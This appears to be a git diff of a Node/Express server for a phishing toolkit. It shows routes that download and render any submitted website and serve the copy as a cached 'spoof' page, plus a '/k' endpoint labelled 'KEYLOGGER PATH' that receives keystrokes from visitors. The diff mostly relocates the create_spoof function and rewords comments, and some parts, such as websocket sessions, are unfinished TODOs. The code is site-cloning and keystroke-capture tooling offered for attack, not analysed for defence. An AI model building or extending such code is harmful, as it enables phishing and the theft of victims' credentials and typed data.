@@ -82,7 +82,7 @@ app.listen(PORT, (err) => {
     log(`Server running on port ${PORT}`)
 })
 
-// MIDDLEWARE
+//* MIDDLEWARE
 app.use(exp.urlencoded({extended: false}))
 app.use(exp.json())
 app.use(exp.static('static'))
@@ -91,7 +91,7 @@ app.use('/scripts', exp.static('scripts'))
 
 //* ROUTING
 
-// spoof page
+//* SERVER SPOOF
 app.get('/:spoof_url', (req, res)=>{
     // 404 on non existant spoof or invalid url
     if(!isURL(req.params.spoof_url)) return res.sendStatus(404)
@@ -99,15 +99,36 @@ app.get('/:spoof_url', (req, res)=>{
     res.send(page_cache[req.params.spoof_url].rendered_page)
 })
 
-//? Main Page
-
-// initiate new spoof
+//* INITITATE SPOOF
 app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
     let url_2_spoof = decodeURI(req.body.url)
     log(`Spoof request for __ ${url_2_spoof} __`)
     let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
     return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
 })
+
+//! Handle creation of new pages for caching
+async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
+    let new_page = new Page()
+
+    // TODO This must be handled by each Page object internally from now on
+    new_page.download_page = await download_page(url)
+    new_page.rendered_page = await render_page(url)
+    new_page.url = url
+
+    // TODO Access internal Page methods here 
+
+
+    // set into global pages object
+    page_cache[url] = new_page 
+    // page_cache.addPage()
+
+    //TODO Create new WS session
+
+
+
+    return new_page.url
+}
 //? KEYLOGGER PATH
 app.post('/k', async (req, res)=>{
     // log(req.body.key)
@@ -116,23 +137,6 @@ app.post('/k', async (req, res)=>{
 
     return res.sendStatus(200)
 })
-//! Handle creation of new pages for caching
-async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
-    let new_page = new Page()
-    new_page.download_page = await download_page(url)
-    new_page.rendered_page = await render_page(url)
-    new_page.url = url
-
-    // set into global pages object
-    page_cache[url] = new_page 
-    // page_cache.addPage()
-
-    // create socket session
-
-
-
-    return new_page.url
-}
 
 
 
